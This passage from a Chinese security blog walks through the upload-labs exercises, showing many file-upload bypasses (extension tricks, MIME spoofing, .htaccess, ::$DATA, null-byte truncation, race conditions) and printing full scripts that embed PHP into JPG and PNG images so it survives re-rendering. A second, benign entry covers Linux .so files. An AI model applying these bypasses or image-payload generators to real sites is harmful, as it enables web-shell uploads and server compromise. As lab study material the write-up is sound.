    <content><![CDATA[<h2 id="0x00-File-Upload"><a href="#0x00-File-Upload" class="headerlink" title="0x00 File-Upload"></a>0x00 File-Upload</h2><p><img src="/File-Upload/upload.png" alt></p>
<ol>
<li>文件上传漏洞，上传过程中有或多或少的安全检测，同样有各种各样的绕过防护。</li>
<li>环境：windows server 2008 + phpstudy PHP5.2.17</li>
</ol>
<h2 id="0x01-前端JS检测"><a href="#0x01-前端JS检测" class="headerlink" title="0x01 前端JS检测"></a>0x01 前端JS检测</h2><ol>
<li>上传一句话木马1.php，前端JS检测</li>
<li><img src="/File-Upload/2.png" alt></li>
<li><img src="/File-Upload/3.png" alt></li>
<li>绕过方式：修改文件后缀名，绕过前端检测，拦截请求包改回来</li>
<li>把1.php改名1.png，拦截上传请求包，改回来</li>
<li><img src="/File-Upload/4.png" alt></li>
<li>Cknife连接</li>
<li><img src="/File-Upload/5.png" alt></li>
</ol>
<h2 id="0x02-MIME检测"><a href="#0x02-MIME检测" class="headerlink" title="0x02 MIME检测"></a>0x02 MIME检测</h2><ol>
<li><img src="/File-Upload/6.png" alt></li>
<li><img src="/File-Upload/7.png" alt></li>
<li>绕过方式：修改Content-Type的值为image/jpeg、image/png、image/gif之一</li>
<li>拦截上传请求包，修改Content-Type的值</li>
<li><img src="/File-Upload/8.png" alt></li>
</ol>
<h2 id="0x03-blacklist检测"><a href="#0x03-blacklist检测" class="headerlink" title="0x03 blacklist检测"></a>0x03 blacklist检测</h2><ol>
<li><img src="/File-Upload/9.png" alt></li>
<li><img src="/File-Upload/10.png" alt></li>
<li>绕过方式：修改文件后缀名为php3、php4、php5、php6、php7、phtml、pht、phar、phpt等等</li>
<li>但有条件，配置里设置是否解析，这里Apache默认设置不解析.phtml</li>
<li><img src="/File-Upload/11.png" alt></li>
<li>手拿放进去，访问，不解析</li>
<li><img src="/File-Upload/12.png" alt></li>
<li>但在kali里就可以解析</li>
<li><img src="/File-Upload/13.png" alt></li>
<li>查看配置/etc/apache2/，*-enabled表示在是用的配置，*-available表示是可用的配置。</li>
<li><img src="/File-Upload/14.png" alt></li>
<li><img src="/File-Upload/15.png" alt></li>
<li>除此，还可以通过.htaccess文件来添加解析类型。</li>
<li>AddType application/x-httpd-php xxx</li>
<li>这里按着靶场的剧本走，假设是可以解析.phtml的（去掉#，重启Apache）</li>
<li><img src="/File-Upload/16.png" alt></li>
<li>再上传，访问</li>
<li><img src="/File-Upload/17.png" alt></li>
<li><img src="/File-Upload/18.png" alt></li>
</ol>
<h2 id="0x04-big-blacklist检测"><a href="#0x04-big-blacklist检测" class="headerlink" title="0x04 big blacklist检测"></a>0x04 big blacklist检测</h2><ol>
<li><img src="/File-Upload/19.png" alt></li>
<li>绕过方式：上传.htaccess文件，改变配置</li>
<li>.htaccess文件内容：SetHandler application/x-httpd-php #所有文件都将当作php文件来解析</li>
<li>上传图片木马，上传.htaccess</li>
<li><img src="/File-Upload/20.png" alt></li>
<li><img src="/File-Upload/21.png" alt></li>
<li>访问../upload/4.jpg</li>
<li><img src="/File-Upload/22.png" alt></li>
</ol>
<h2 id="0x05-htaccess-in-big-blacklist检测-去尾点-转换为小写-首尾去空-去-DATA"><a href="#0x05-htaccess-in-big-blacklist检测-去尾点-转换为小写-首尾去空-去-DATA" class="headerlink" title="0x05 .htaccess in big blacklist检测+去尾点+转换为小写+首尾去空+去::$DATA"></a>0x05 .htaccess in big blacklist检测+去尾点+转换为小写+首尾去空+去::$DATA</h2><ol>
<li>利用windows的文件特性绕过：5.php. .，点空格点</li>
<li><img src="/File-Upload/23.png" alt></li>
<li><img src="/File-Upload/24.png" alt></li>
</ol>
<h2 id="0x06-big-blacklist检测-去尾点-转换为小写-首尾去空"><a href="#0x06-big-blacklist检测-去尾点-转换为小写-首尾去空" class="headerlink" title="0x06 big blacklist检测+去尾点+转换为小写+首尾去空"></a>0x06 big blacklist检测+去尾点+转换为小写+首尾去空</h2><ol>
<li><img src="/File-Upload/25.png" alt></li>
<li>大小写绕过：6.Php</li>
<li><img src="/File-Upload/26.png" alt></li>
<li><img src="/File-Upload/27.png" alt></li>
</ol>
<h2 id="0x07-big-blacklist检测-去尾点-转换为小写-去-DATA"><a href="#0x07-big-blacklist检测-去尾点-转换为小写-去-DATA" class="headerlink" title="0x07 big blacklist检测+去尾点+转换为小写+去::$DATA"></a>0x07 big blacklist检测+去尾点+转换为小写+去::$DATA</h2><ol>
<li><img src="/File-Upload/28.png" alt></li>
<li>末尾部加空格绕过，7.php[空格]</li>
<li><img src="/File-Upload/29.png" alt></li>
<li><img src="/File-Upload/30.png" alt></li>
</ol>
<h2 id="0x08-big-blacklist检测-转换为小写-去-DATA-首尾去空"><a href="#0x08-big-blacklist检测-转换为小写-去-DATA-首尾去空" class="headerlink" title="0x08 big blacklist检测+转换为小写+去::$DATA+首尾去空"></a>0x08 big blacklist检测+转换为小写+去::$DATA+首尾去空</h2><ol>
<li><img src="/File-Upload/31.png" alt></li>
<li>文件后缀名加点绕过：8.php.</li>
<li><img src="/File-Upload/32.png" alt></li>
<li><img src="/File-Upload/33.png" alt></li>
</ol>
<h2 id="0x09-big-blacklist检测-去尾点-转换为小写-首尾去空"><a href="#0x09-big-blacklist检测-去尾点-转换为小写-首尾去空" class="headerlink" title="0x09 big blacklist检测+去尾点+转换为小写+首尾去空"></a>0x09 big blacklist检测+去尾点+转换为小写+首尾去空</h2><ol>
<li><img src="/File-Upload/34.png" alt></li>
<li>利用windows文件流特性绕过：9.php::$DATA</li>
<li><img src="/File-Upload/35.png" alt></li>
<li><img src="/File-Upload/36.png" alt></li>
</ol>
<h2 id="0x0A-big-blacklist检测-去尾点-转换为小写-首尾去空-去-DATA"><a href="#0x0A-big-blacklist检测-去尾点-转换为小写-首尾去空-去-DATA" class="headerlink" title="0x0A big blacklist检测+去尾点+转换为小写+首尾去空+去::$DATA"></a>0x0A big blacklist检测+去尾点+转换为小写+首尾去空+去::$DATA</h2><ol>
<li><img src="/File-Upload/37.png" alt></li>
<li>与0x05一样利用windows的文件特性绕过：10.php. .，点空格点</li>
<li><img src="/File-Upload/38.png" alt></li>
<li><img src="/File-Upload/39.png" alt></li>
</ol>
<h2 id="0x0B-big-blacklist检测-替换为空"><a href="#0x0B-big-blacklist检测-替换为空" class="headerlink" title="0x0B big blacklist检测+替换为空"></a>0x0B big blacklist检测+替换为空</h2><ol>
<li><img src="/File-Upload/40.png" alt></li>
<li>双文件名绕过：11.pphphp</li>
<li><img src="/File-Upload/41.png" alt></li>
<li><img src="/File-Upload/42.png" alt></li>
</ol>
<h2 id="0x0C-whitelist检测-GET请求截断"><a href="#0x0C-whitelist检测-GET请求截断" class="headerlink" title="0x0C whitelist检测+GET请求截断"></a>0x0C whitelist检测+GET请求截断</h2><ol>
<li><img src="/File-Upload/43.png" alt></li>
<li>必须条件：PHP&lt;5.3.4，php.ini下设置magic_quotes_gpc = Off</li>
<li>路径可控，路径后+文件名+%00</li>
<li>绕过：选中%00，ctrl+shift+u</li>
<li><img src="/File-Upload/44.png" alt></li>
<li><img src="/File-Upload/45.png" alt></li>
</ol>
<h2 id="0x0D-whitelist检测-POST请求截断"><a href="#0x0D-whitelist检测-POST请求截断" class="headerlink" title="0x0D whitelist检测+POST请求截断"></a>0x0D whitelist检测+POST请求截断</h2><ol>
<li><img src="/File-Upload/46.png" alt></li>
<li>必须条件：PHP&lt;5.3.4，php.ini下设置magic_quotes_gpc = Off</li>
<li>路径可控，路径后+文件名+%00</li>
<li>绕过：选中%00，ctrl+shift+u</li>
<li><img src="/File-Upload/47.png" alt></li>
<li><img src="/File-Upload/48.png" alt></li>
</ol>
<h2 id="0x10-——-——-——-——-——-——-——-——-——-——-——"><a href="#0x10-——-——-——-——-——-——-——-——-——-——-——" class="headerlink" title="0x10 —— —— —— —— —— —— —— —— —— —— ——"></a>0x10 —— —— —— —— —— —— —— —— —— —— ——</h2><ol>
<li>以下上传图片木马配合文件包含漏洞</li>
</ol>
<h2 id="0x11-文件类型检测"><a href="#0x11-文件类型检测" class="headerlink" title="0x11 文件类型检测"></a>0x11 文件类型检测</h2><ol>
<li><img src="/File-Upload/49.png" alt></li>
<li>读取2字节判断上传文件的类型</li>
<li><img src="/File-Upload/52.png" alt></li>
<li><img src="/File-Upload/53.png" alt></li>
<li><a href="https://www.runoob.com/php/func-misc-unpack.html" target="_blank" rel="noopener">unpack函数</a></li>
<li>上传包含木马的图片，结合文件包含漏洞来利用。</li>
<li>绕过：文件内容前添加GIF89a</li>
<li><img src="/File-Upload/50.png" alt></li>
<li><img src="/File-Upload/51.png" alt></li>
</ol>
<h2 id="0x12-获取文件相关信息并检测"><a href="#0x12-获取文件相关信息并检测" class="headerlink" title="0x12 获取文件相关信息并检测"></a>0x12 获取文件相关信息并检测</h2><ol>
<li><img src="/File-Upload/54.png" alt></li>
<li>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</li>
<li>$info = getimagesize($filename);</li>
<li>$ext = image_type_to_extension($info[2]); #这里就是获取后缀名</li>
<li>phpinfo.php</li>
<li><img src="/File-Upload/55.png" alt></li>
<li>获取phpinfo.php的文件相关信息</li>
<li><img src="/File-Upload/56.png" alt></li>
<li>绕过：文件内容前添加GIF89a</li>
<li><img src="/File-Upload/57.png" alt></li>
<li><img src="/File-Upload/58.png" alt></li>
</ol>
<h2 id="0x13-exif-imagetype函数检测"><a href="#0x13-exif-imagetype函数检测" class="headerlink" title="0x13 exif_imagetype函数检测"></a>0x13 exif_imagetype函数检测</h2><ol>
<li><img src="/File-Upload/59.png" alt></li>
<li><a href="https://www.php.net/manual/zh/function.exif-imagetype.php" target="_blank" rel="noopener">exif_imagetype — 读取一个图像的第一个字节并检查其签名。</a></li>
<li>必须开启php_exif模块</li>
<li><img src="/File-Upload/60.png" alt></li>
<li>制作图片木马</li>
<li>copy 2.jpg/b+phpinfo.php/a phpinfo.jpg</li>
<li><img src="/File-Upload/62.png" alt></li>
<li><img src="/File-Upload/61.png" alt></li>
<li><img src="/File-Upload/63.png" alt></li>
</ol>
<h2 id="0x14-二次渲染"><a href="#0x14-二次渲染" class="headerlink" title="0x14 二次渲染"></a>0x14 二次渲染</h2><p><strong>关键代码</strong></p>
<pre><code>$is_upload = false;
$msg = null;
if (isset($_POST[&#39;submit&#39;])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
    $filetype = $_FILES[&#39;upload_file&#39;][&#39;type&#39;];
    $tmpname = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];

    $target_path=UPLOAD_PATH.&#39;/&#39;.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,&quot;.&quot;),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = &quot;该文件不是jpg格式的图片！&quot;;
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).&quot;.jpg&quot;;
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = &quot;上传出错！&quot;;
        }

    }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = &quot;该文件不是png格式的图片！&quot;;
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).&quot;.png&quot;;
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = &quot;上传出错！&quot;;
        }

    }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = &quot;该文件不是gif格式的图片！&quot;;
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).&quot;.gif&quot;;
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = &quot;上传出错！&quot;;
        }
    }else{
        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;
    }
}</code></pre><ol>
<li><strong>上传过程：</strong></li>
<li>图片后插入木马，上传图片木马后，下载它，与原图片进行对比，查看图片文件渲染哪些位置</li>
<li>查看木马代码是否被渲染了，选择没被渲染的部分插入木马代码，再上传。</li>
<li><strong>测试gif图片</strong></li>
<li><img src="/File-Upload/gif.gif" alt></li>
<li><img src="/File-Upload/66.png" alt></li>
<li><img src="/File-Upload/67.png" alt></li>
<li>利用文件包含漏洞验证脚本：</li>
<li><img src="/File-Upload/68.png" alt></li>
<li></li>
<li><strong>测试jpg图片</strong></li>
<li><img src="/File-Upload/phpinfo.jpg" alt></li>
<li><a href="#jump">大牛编写的脚本jpg_payload.php</a></li>
<li>php jpg_payload.php 1.jpg #windows下多次不行就换到Linux里</li>
<li><img src="/File-Upload/65.png" alt></li>
<li><img src="/File-Upload/64.png" alt></li>
<li>上传后，php代码还是可能会被破坏~</li>
<li></li>
<li><strong>测试php图片</strong></li>
<li><img src="/File-Upload/png.png" alt></li>
<li>png+<a href="#jump">PLTE数据块写入php代码计算CRC脚本</a></li>
<li><img src="/File-Upload/72.png" alt></li>
<li><img src="/File-Upload/73.png" alt></li>
<li>上传</li>
<li><img src="/File-Upload/71.png" alt></li>
<li>同样，php代码是否被破坏，下载下来打开查看。</li>
<li></li>
<li>png+<a href="#jump">大牛写的脚本png.php</a></li>
<li><img src="/File-Upload/69.png" alt></li>
<li><img src="/File-Upload/70.png" alt></li>
</ol>
<h2 id="0x15-条件竞争1"><a href="#0x15-条件竞争1" class="headerlink" title="0x15 条件竞争1"></a>0x15 条件竞争1</h2><ol>
<li>白名单判断是否允许类型文件，否则unlink()删除文件</li>
<li><img src="/File-Upload/74.png" alt></li>
<li>利用条件竞争来同时上传木马和访问木马</li>
<li><img src="/File-Upload/75.png" alt></li>
<li><img src="/File-Upload/76.png" alt></li>
<li>成功访问</li>
<li><img src="/File-Upload/77.png" alt></li>
</ol>
<h2 id="0x16-条件竞争2"><a href="#0x16-条件竞争2" class="headerlink" title="0x16 条件竞争2"></a>0x16 条件竞争2</h2><ol>
<li>对上传文件白名单验证后缀名，进行move()保存临时目录，再rename</li>
<li>直接上传木马图片</li>
<li><img src="/File-Upload/78.png" alt></li>
<li><img src="/File-Upload/79.png" alt></li>
<li><img src="/File-Upload/80.png" alt></li>
</ol>
<h2 id="0x17-黑名单-文件名可控"><a href="#0x17-黑名单-文件名可控" class="headerlink" title="0x17 黑名单+文件名可控"></a>0x17 黑名单+文件名可控</h2><ol>
<li><img src="/File-Upload/81.png" alt></li>
<li>直接上传php木马，绕过黑名单就行（如果服务器可以解析的话）</li>
<li><img src="/File-Upload/82.png" alt></li>
<li><img src="/File-Upload/83.png" alt></li>
<li>/.绕过</li>
<li>自定义文件名为19.php/.</li>
<li><img src="/File-Upload/84.png" alt></li>
<li><img src="/File-Upload/85.png" alt></li>
</ol>
<h2 id="0x18-文件类型白名单-文件后缀名白名单检测"><a href="#0x18-文件类型白名单-文件后缀名白名单检测" class="headerlink" title="0x18 文件类型白名单+文件后缀名白名单检测"></a>0x18 文件类型白名单+文件后缀名白名单检测</h2><ol>
<li>数组+/绕过</li>
<li><img src="/File-Upload/86.png" alt></li>
<li><img src="/File-Upload/87.png" alt></li>
</ol>
<h2 id="0x20-其他上传姿势"><a href="#0x20-其他上传姿势" class="headerlink" title="0x20 其他上传姿势"></a>0x20 其他上传姿势</h2><ol>
<li>1.php——1%0a.php #换行</li>
<li>1.jpg.png.gif.php #双重后缀名、多重后缀名</li>
<li>1.asp;.jpg #利用IIS解析漏洞</li>
<li>./0.asp/1.jpg #利用IIS6.0解析漏洞</li>
<li>/1.php #IIS7.0/7.5解析漏洞</li>
<li>1.jpg%00.php #nginx（0.5.x, 0.6.x, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37）空字节漏洞，php版本要小于5.3.4</li>
<li>1.png/2.php #nginx解析漏洞</li>
<li>1.php.asd #apache解析漏洞，从右往左解析，解析不了就跳过，解析下一个后缀名</li>
<li>1.php:2.jpg</li>
<li>3.php::$DATA</li>
<li>4.php::$DATA……..</li>
<li>fuzz黑名单文件名</li>
</ol>
<h2 id="0x30-黑名单"><a href="#0x30-黑名单" class="headerlink" title="0x30 黑名单"></a>0x30 黑名单</h2><ol>
<li>.php、.php5、.php4、.php3、.php2、.php1、.html、.htm、.phtml、.pht、.pHp、.pHp5、.pHp4、</li>
<li>.pHp3、.pHp2、.pHp1、.Html、.Htm、.pHtml、.jsp、.jspa、.jspx、.jsw、.jsv、.jspf、.jtml、</li>
<li>.jSp、.jSpx、.jSpa、.jSw、.jSv、.jSpf、.jHtml、.asp、.aspx、.asa、.asax、.ascx、.ashx、</li>
<li>.asmx、.cer、.aSp、.aSpx、.aSa、.asac、.aSax、.aScx、.aShx、.aSmx、.cEr、.sWf、.swf、.ini</li>
<li>.cfm、.shtml、.cdx</li>
</ol>
<h2 id="0xFD-防护策略"><a href="#0xFD-防护策略" class="headerlink" title="0xFD 防护策略"></a>0xFD 防护策略</h2><ol>
<li>设置上传文件的文件后缀名白名单</li>
<li>限制上传文件的大小，文件内容识别</li>
<li>设置复杂随机的路径名与文件名</li>
<li>禁止错误信息回显上传文件的绝对路径</li>
<li>网站不存在文件解析漏洞</li>
<li>上传文件的保存目录只有读写权限，没有执行权限</li>
<li>设置单独的文件服务器与域名</li>
</ol>
<h2 id="0xFE-参考"><a href="#0xFE-参考" class="headerlink" title="0xFE 参考"></a>0xFE 参考</h2><ol>
<li><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></li>
<li><a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a></li>
<li><a href="https://xz.aliyun.com/t/4029#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/4029#toc-13</a></li>
</ol>
<h2 id="0xFF-代码"><a href="#0xFF-代码" class="headerlink" title="0xFF 代码"></a>0xFF 代码</h2><p><strong>简单的文件上传代码</strong><br><strong>upload.html</strong></p>
<pre><code>&lt;html&gt;
&lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;title&gt;
        File Upload
    &lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
        &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;
        &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br/&gt;
        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><p><strong>upload.php</strong></p>
<pre><code>&lt;?php
highlight_file(__FILE__);
echo &quot;&lt;br&gt;&quot;;

#JS检测
$allow_extensions=array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);
$extension=end(explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]));
if(in_array($extension,$allow_extensions)){
    if($_FILES[&quot;file&quot;][&quot;error&quot;]&gt;0)
    {
        echo &quot;错误：&quot;.$_FILES[&quot;file&quot;][&quot;error&quot;].&quot;&lt;br&gt;&quot;;
    }
    else
    {
        echo &quot;文件名：&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;].&quot;&lt;br&gt;&quot;;
        echo &quot;文件类型：&quot;.$_FILES[&quot;file&quot;][&quot;type&quot;].&quot;&lt;br&gt;&quot;;
        echo &quot;文件大小：&quot;.$_FILES[&quot;file&quot;][&quot;size&quot;].&quot;&lt;br&gt;&quot;;
        echo &quot;文件临时位置：&quot;.$_FILES[&quot;file&quot;][&quot;tmp_name&quot;].&quot;&lt;br&gt;&quot;;
    }

    if(file_exists(&quot;files/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]))
    {
        echo $_FILES[&quot;file&quot;][&quot;name&quot;].&quot;文件已存在&quot;;
    }
    else
    {
        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;files/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);
        echo &quot;文件保存在：&quot;.&quot;files/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];
    }
}
else
{
    echo &quot;非法文件&quot;;
}
?&gt;</code></pre><p><img src="/File-Upload/1.png" alt></p>
<p><strong><span id="jump">大牛编写的脚本jpg_payload.php</span></strong></p>
<pre><code>&lt;?php
    /*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php &lt;jpg_name.jpg&gt;

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov @Black2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */

    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;


    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) {
        die(&#39;php-gd is not installed&#39;);
    }

    if(!isset($argv[1])) {
        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);
    }

    set_error_handler(&quot;custom_error_handler&quot;);

    for($pad = 0; $pad &lt; 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis-&gt;readShort() != 0xFFD8) {
            die(&#39;Incorrect SOI marker&#39;);
        }

        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) {
            $marker = $dis-&gt;readByte();
            $size = $dis-&gt;readShort() - 2;
            $dis-&gt;skip($size);
            if($marker === 0xDA) {
                $startPos = $dis-&gt;seek();
                $outStreamTmp =
                    substr($outStream, 0, $startPos) .
                    $miniPayload .
                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .
                    substr($outStream, $startPos);
                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis-&gt;eof())) {
                        if($dis-&gt;readByte() === 0xFF) {
                            if($dis-&gt;readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis-&gt;seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream =
                        substr($outStream, 0, $startPos) .
                        $miniPayload .
                        substr(
                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) {
                    die(&#39;Success!&#39;);
                } else {
                    break;
                }
            }
        }
    }
    unlink(&#39;payload_&#39;.$argv[1]);
    die(&#39;Something\&#39;s wrong&#39;);

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this-&gt;binData = &#39;&#39;;
            $this-&gt;order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);
                $this-&gt;binData = file_get_contents($filename);
            } else {
                $this-&gt;binData = $filename;
            }
            $this-&gt;size = strlen($this-&gt;binData);
        }

        public function seek() {
            return ($this-&gt;size - strlen($this-&gt;binData));
        }

        public function skip($skip) {
            $this-&gt;binData = substr($this-&gt;binData, $skip);
        }

        public function readByte() {
            if($this-&gt;eof()) {
                die(&#39;End Of File&#39;);
            }
            $byte = substr($this-&gt;binData, 0, 1);
            $this-&gt;binData = substr($this-&gt;binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this-&gt;binData) &lt; 2) {
                die(&#39;End Of File&#39;);
            }
            $short = substr($this-&gt;binData, 0, 2);
            $this-&gt;binData = substr($this-&gt;binData, 2);
            if($this-&gt;order) {
                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);
        }
    }
?&gt;</code></pre><p><strong><span id="jump">PLTE数据块写入php代码计算CRC脚本</span></strong>：png_PLTE_crc.py</p>
<pre><code>import binascii
import re

png = open(r&#39;4.png&#39;,&#39;rb&#39;)
a = png.read()
png.close()
hexstr = binascii.b2a_hex(a)

&#39;&#39;&#39; PLTE crc &#39;&#39;&#39;
data =  &#39;504c5445&#39;+ re.findall(&#39;504c5445(.*?)49444154&#39;,hexstr)[0]
crc = binascii.crc32(data[:-16].decode(&#39;hex&#39;)) &amp; 0xffffffff
print hex(crc)</code></pre><p><strong><span id="jump">大牛写的脚本png.php</span></strong>，直接拿来运行即可</p>
<pre><code>&lt;?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y &lt; sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,&#39;./1.png&#39;);
?&gt;</code></pre>]]></content>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-.so文件</title>
    <url>/Linux-so%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="0x00-各类文件"><a href="#0x00-各类文件" class="headerlink" title="0x00 各类文件"></a>0x00 各类文件</h2><ol>
<li>.o：目标文件，相当于windows的.obj文件</li>
<li>.so：共享对象，shared object，用于动态连接，类似.dll</li>
<li>.a：静态文件，多个.o组成，用于静态连接</li>
</ol>
<h2 id="0x01-查看-so文件"><a href="#0x01-查看-so文件" class="headerlink" title="0x01 查看.so文件"></a>0x01 查看.so文件</h2><ol>
<li>nm -D xx.so</li>
<li>objdump -Tt xx.so</li>
</ol>
<h2 id="0x02-创建-so文件并调用"><a href="#0x02-创建-so文件并调用" class="headerlink" title="0x02 创建.so文件并调用"></a>0x02 创建.so文件并调用</h2><ol>
<li><p>aaa.c</p>
<pre><code>void aaa_say()
{
 printf(&quot;aaa say: I am libaaa.so\n&quot;);
}</code></pre></li>
<li><p>bbb.c</p>
<pre><code>#include &lt;stdio.h&gt;
int main()
{
 aaa_say();
 printf(&quot;bbb say: I am bbb\n&quot;);
 return 0;
}</code></pre></li>
<li><p>先使用命令：export LD_LIBRARY_PATH=$(pwd) 将当前目录设为gcc搜索.so库的路径，否则是找不到.so库的。</p>
</li>
<li><p>编译aaa.c：gcc aaa.c -o libaaa.so -fPIC -shared</p>
</li>
<li><p>编译bbb.c：gcc bbb.c -o bbb -laaa -L. </p>
</li>
<li><p>执行./bbb</p>
</li>
<li><p><img src="/Linux-so%E6%96%87%E4%BB%B6/1.png" alt></p>
</li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://www.jianshu.com/p/c2fa2a816916" target="_blank" rel="noopener">https://www.jianshu.com/p/c2fa2a816916</a></li>
</ol>
